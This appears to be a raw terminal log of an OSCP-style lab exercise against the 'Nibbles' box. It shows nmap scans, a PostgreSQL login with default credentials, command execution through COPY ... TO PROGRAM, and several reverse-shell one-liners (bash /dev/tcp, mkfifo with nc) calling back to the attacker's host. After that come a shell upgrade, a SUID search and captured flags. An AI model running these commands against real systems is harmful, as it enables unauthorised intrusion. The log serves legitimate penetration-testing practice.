@@ -1,0 +1,212 @@
+
+=== SESSION START: 2026-08-27 12:10:39 | Box: Nibbles | IP: 192.168.183.47 | Platform: Offsec ===
+
+$ [12:10:42] htblog
+
+=== OUTPUT CAPTURE START: 2026-08-27 12:10:42 ===
+
+$ [12:11:04] sudo nmap -p- --min-rate 10000 -oN allports.nmap $BoxIP
+
+=== SESSION RECONNECT: 2026-08-27 12:12:35 ===
+
+$ [12:12:40] htblog
+
+=== OUTPUT CAPTURE START: 2026-08-27 12:12:40 ===
+
+$ [12:13:39] sudo nmap -sU --top-ports 100 -oA nmap/${BoxName}_udp $BoxIP
+
+$ [12:15:06] sudo nmap -sV -sC -p 21,22,80,5437 -oN services.nmap $BoxIP
+
+$ [12:17:27] ftp $BoxIP
+
+$ [12:18:14] curl -s http://$BoxIP/
+Script started on 2026-08-27 12:10:42+01:00 [COMMAND="zsh -i" TERM="xterm-256color" TTY="/dev/pts/9" COLUMNS="238" LINES="55"]
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nibbles[39m [33m[12:10:42][39m $ [K[?1h=[?2004hsudo nmap -p- --min-rate 10000 -oN allports.nmap $BoxIP[55D[4m[32ms[4m[32mu[4m[32md[4m[32mo[24m[39m [32mn[32mm[32ma[32mp[39m[46C[?1l>[?2004l
+[sudo] password for kali: 
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-27 12:11 +0100
+Nmap scan report for 192.168.183.47
+Host is up (0.017s latency).
+Not shown: 65529 filtered tcp ports (no-response)
+PORT     STATE  SERVICE
+21/tcp   open   ftp
+22/tcp   open   ssh
+80/tcp   open   http
+139/tcp  closed netbios-ssn
+445/tcp  closed microsoft-ds
+5437/tcp open   pmip6-data
+
+Nmap done: 1 IP address (1 host up) scanned in 13.86 seconds
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nibbles[39m [33m[12:11:20][39m $ [K[?1h=[?2004h[0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nibbles[39m [33m[12:12:35][39m $ sudo nmap -sV -sC -p 21,22,80,5437 -oN services.nmap $BoxIP[59D[4m[32ms[4m[32mu[4m[32md[4m[32mo[24m[39m [32mn[32mm[32ma[32mp[39m[50C[?1l>[?2004l
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-27 12:15 +0100
+Nmap scan report for 192.168.183.47
+Host is up (0.014s latency).
+
+PORT     STATE SERVICE    VERSION
+21/tcp   open  ftp        vsftpd 3.0.3
+22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 10:62:1f:f5:22:de:29:d4:24:96:a7:66:c3:64:b7:10 (RSA)
+|   256 c9:15:ff:cd:f3:97:ec:39:13:16:48:38:c5:58:d7:5f (ECDSA)
+|_  256 90:7c:a3:44:73:b4:b4:4c:e3:9c:71:d1:87:ba:ca:7b (ED25519)
+80/tcp   open  http       Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Enter a title, displayed at the top of the window.
+5437/tcp open  postgresql PostgreSQL DB 11.3 - 11.9
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=debian
+| Subject Alternative Name: DNS:debian
+| Not valid before: 2020-04-27T15:41:47
+|_Not valid after:  2030-04-25T15:41:47
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.31 seconds
+[1m[7m%[27m[1m[0m                                                                                                                      [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nibbles[39m [33m[12:15:20][39m $ [K[?1h=[?2004hftp $BoxIP[10D[32mf[32mt[32mp[39m[7C[?1l>[?2004l
+Connected to 192.168.183.47.
+220 (vsFTPd 3.0.3)
+Name (192.168.183.47:kali): anonymous
+331 Please specify the password.
+Password: 
+530 Login incorrect.
+ftp: Login failed
+ftp> quit
+221 Goodbye.
+[1m[7m%[27m[1m[0m                                                                                                                      [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nibbles[39m [33m[12:17:57][39m $ [K[?1h=[?2004hcurl -s http://$BoxIP/[22D[32mc[32mu[32mr[32ml[39m[18C[?1l>[?2004l
+<html>
+<!-- Text between angle brackets is an HTML tag and is not displayed.
+Most tags, such as the HTML and /HTML tags that surround the contents of
+a page, come in pairs; some tags, like HR, for a horizontal rule, stand 
+alone. Comments, such as the text you're reading, are not displayed when
+the Web page is
+$ [12:18:38] psql -h $BoxIP -p 5437 -U postgres
+
+$ [12:19:57] loot cred postgres postgres
+
+$ [12:21:33] sudo nc -lvnp 443
+
+=== SESSION RECONNECT: 2026-08-27 12:24:58 ===
+
+$ [12:25:01] htblog
+
+=== OUTPUT CAPTURE START: 2026-08-27 12:25:01 ===
+
+$ [12:25:07] sudo tcpdump -i tun0 icmp
+ shown. The information between the HEAD and /HEAD tags is 
+not displayed. The information between the BODY and /BODY tags is displayed.-->
+<head>
+<title>Enter a title, displayed at the top of the window.</title>
+</head>
+<!-- The information between the BODY and /BODY tags is displayed.-->
+<body>
+<h1>Enter the main heading, usually the same as the title.</h1>
+<p>Be <b>bold</b> in stating your key points. Put them in a list: </p>
+<ul>
+<li>The first item in your list</li>
+<li>The second item; <i>italicize</i> key words</li>
+</ul>
+<p>Improve your image by including an image. </p>
+<p><img src="pic.png" alt="A Great HTML Resource"></p>
+<p>Add a link to your favorite <a href="#">Web site</a>.
+Break up your page with a horizontal rule or two. </p>
+<hr>
+<p>Finally, link to <a href="page2.html">another page</a> in your own Web site.</p>
+<!-- And add a copyright notice.-->
+<p>
+    <a href="nightmare.jpg" target="blank">Internet cats</a>
+</p>
+</body>
+</html>[1m[7m%[27m[1m[0m                                                                                                                      [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nibbles[39m [33m[12:18:15][39m $ [K[?1h=[?2004hpsql -h $BoxIP -p 5437 -U postgres[34D[32mp[32ms[32mq[32ml[39m[30C[?1l>[?2004l
+Password for user postgres: 
+psql (18.4 (Debian 18.4-1+b1), server 11.7 (Debian 11.7-0+deb10u1))
+SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off, ALPN: none)
+Type "help" for help.
+
+[?2004hpostgres=# [7mSELECT current_user, pg_postmaster_start_time();[27m[C[C[C[C[C[C[C[C[C[C[CSELECT current_user, pg_postmaster_start_time();
+[?2004l current_user |   pg_postmaster_start_time    
+--------------+-------------------------------
+ postgres     | 2025-11-14 02:48:28.421131-05
+(1 row)
+
+[?2004hpostgres=# [7mSELECT current_setting('is_superuser');[27m[C[C[C[C[C[C[C[C[C[C[CSELECT current_setting('is_superuser');
+[?2004l current_setting 
+-----------------
+ on
+(1 row)
+
+[?2004hpostgres=# [7mCOPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/192.168.45.194/443 0>&1"';[27m[C[C[C[C[C[C[C[C[C[C[CCOPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/192.168.45.194/443 0>&1"';
+[?2004lERROR:  program "bash -c "bash -i >& /dev/tcp/192.168.45.194/443 0>&1"" failed
+DETAIL:  child process exited with exit code 1
+[?2004hpostgres=# [7mCOPY (SELECT '') TO PROGRAM 'bash -i >& /dev/tcp/192.168.45.194/443 0>&1';[27m[C[C[C[C[C[C[C[C[C[C[CCOPY (SELECT '') TO PROGRAM 'bash -i >& /dev/tcp/192.168.45.194/443 0>&1';
+[?2004lERROR:  program "bash -i >& /dev/tcp/192.168.45.194/443 0>&1" failed
+DETAIL:  child process exited with exit code 2
+[?2004hpostgres=# [7mCOPY (SELECT '') TO PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.194 443 >/t[27m[7mm[27m[7mp/f';[27m[A[C[C[C[C[CCOPY (SELECT '') TO PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.194 443 >/tmp/f';
+[?2004lERROR:  program "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.194 443 >/tmp/f" failed
+DETAIL:  child process exited with exit code 1
+[?2004hpostgres=# [7mCOPY (SELECT '') TO PROGRAM 'ping -c 4 192.168.45.194';[27m[C[C[C[C[C[C[C[C[C[C[CCOPY (SELECT '') TO PROGRAM 'ping -c 4 192.168.45.194';
+[?2004lCOPY 1
+[?2004hpostgres=# [7mCREATE TABLE cmd_out (output text);[27m
+[7mCOPY cmd_out FROM PROGRAM 'which nc bash python3 perl curl wget 2>/dev/null';[27m
+[7mSELECT * FROM cmd_out;[27m
+[7mDROP TABLE cmd_out;[27m[A[A[ACREATE TABLE cmd_out (output text);
+COPY cmd_out FROM PROGRAM 'which nc bash python3 perl curl wget 2>/dev/null';
+SELECT * FROM cmd_out;
+DROP TABLE cmd_out;
+[?2004lCREATE TABLE
+ERROR:  program "which nc bash python3 perl curl wget 2>/dev/null" failed
+DETAIL:  child process exited with exit code 1
+ output 
+--------
+(0 rows)
+
+DROP TABLE
+[?2004hpostgres=# [7mCREATE TABLE cmd_out (output text);[27m
+
+$ [12:28:03] sudo nc -lvnp 80
+
+$ [12:31:19] stty raw -echo; fg
+Script started on 2026-08-27 12:12:40+01:00 [COMMAND="zsh -i" TERM="xterm-256color" TTY="/dev/pts/8" COLUMNS="117" LINES="55"]
+[1m[7m%[27m[1m[0m                                                                                                                     [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nibbles[39m [33m[12:12:40][39m $ [K[?1h=[?2004hs[4ms[24m[4ms[4mu[24m[24m[32ms[24m[32mu[39m[32ms[32mu[32md[39m[1m[31ms[1m[31mu[1m[31md[0m[39m[1m[31md[1m[31mo[0m[39m[0m[4m[32ms[0m[4m[32mu[0m[4m[32md[0m[4m[32mo[24m[39m[4m[32mo[4m[32m [24m[39m[4m[32mo[24m[39m[24m[39m n[4mn[24m[4mn[4mm[24m[24m[32mn[24m[32mm[39m[32mm[32ma[39m[39m[4mn[39m[4mm[39m[4ma[24m[4ma[4mp[24m[24m[32mn[24m[32mm[24m[32ma[24m[32mp[39m[32mp[32m [39m[32mp[39m[39m -sU top -100          [32ma[39m[39m [39m[4mn[39m[4mm[39m[4ma[24m[4mm[24m[24m [24m[32mn[24m[32mm[39m[32mn[39m[39m [39m[4mn[24m[24m nmap -sU --top-ports 100 -oA nmap/${BoxName}_udp $BoxIP[55D[32mn[32mm[32ma[32mp[39m[51C[?1l>[?2004l
+[sudo] password for kali: 
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-27 12:13 +0100
+Nmap scan report for 192.168.183.47
+Host is up (0.021s latency).
+All 100 scanned ports on 192.168.183.47 are in ignored states.
+Not shown: 100 open|filtered udp ports (no-response)
+
+Nmap done: 1 IP address (1 host up) scanned in 3.85 seconds
+[1m[7m%[27m[1m[0m                                                                                                                     [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nibbles[39m [33m[12:13:45][39m $ [K[?1h=[?2004hloot cred postgres postgres[27D[32ml[32mo[32mo[32mt[39m[23C[?1l>[?2004l
+[+] Cred saved:  postgres:postgres  →  loot/creds.txt
+[1m[7m%[27m[1m[0m                                                                                                                     [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nibbles[39m [33m[12:19:57][39m $ [K[?1h=[?2004hsudo nc -lvnp 443[17D[4m[32ms[4m[32mu[4m[32md[4m[32mo[24m[39m [32mn[32mc[39m[10C[?1l>[?2004l
+Listening on 0.0.0.0 443
+^C
+[1m[7m%[27m[1m[0m                                                                                                                     [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nibbles[39m [33m[12:28:01][39m $ [K[?1h=[?2004h[?2004l
+[1m[7m%[27m[1m[0m                                                                                                                     [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nibbles[39m [33m[12:28:01][39m $ [K[?1h=[?2004hsudo nc -lvnp 80[16D[4m[32ms[4m[32mu[4m[32md[4m[32mo[24m[39m [32mn[32mc[39m[9C[?1l>[?2004l
+Listening on 0.0.0.0 80
+Connection received on 192.168.183.47 44652
+bash: cannot set terminal process group (1221): Inappropriate ioctl for device
+bash: no job control in this shell
+postgres@nibbles:/var/lib/postgresql/11/main$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+<in$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+postgres@nibbles:/var/lib/postgresql/11/main$ ^Z
+zsh: suspended  sudo nc -lvnp 80
+[1m[7m%[27m[1m[0m                                                                                                                     [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nibbles[39m [33m[12:31:11][39m $ [K[?1h=[?2004hstty raw -echo; fg[18D[32ms[32mt[32mt[32my[39m[12C[32mf[32mg[39m[?1l>[?2004l
+[1]  + continued  sudo nc -lvnp 80
+
+postgres@nibbles:/var/lib/postgresql/11/main$ export TERM=xterm
+postgres@nibbles:/var/lib/postgresql/11/main$ find / -perm -4000 -type f 2>/dev/null
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr
+=== SESSION RECONNECT: 2026-08-27 12:37:35 ===
+
+$ [12:37:45] proof linux
+
+$ [12:38:20] loot flag root fc2033af2f11d5f1809dad1734d7764b
+
+$ [12:41:16] loot flag user 2fe8bd41588725cf3cedb4689bc8937d
+
+$ [12:43:38] cp ~/Platforms/Offsec/Nibbles/Nibbles.log ~/Documents/Obsidian/main-vault/OSCP/BOXES/BOX\ LOGS/Nibbles.log
